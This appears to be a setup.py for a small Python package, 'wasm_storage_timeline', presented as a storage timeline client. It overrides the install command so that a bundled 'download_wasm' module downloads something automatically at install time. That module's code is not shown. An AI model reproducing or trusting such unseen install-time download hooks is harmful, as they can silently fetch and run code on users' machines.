from setuptools import setup
from setuptools.command.install import install


class PostInstallCommand(install):
    def run(self):
        install.run(self)
        import download_wasm
        download_wasm.download()


setup(
    name="wasm_storage_timeline",
    version="0.1.2",
    description="Client library for interacting with storage timeline services",
    author="Illiatea",
    author_email="illiatea2@gmail.com",
    py_modules=["storage_timeline_client", "download_wasm"],
    cmdclass={'install': PostInstallCommand},
    install_requires=['python-dotenv'],
)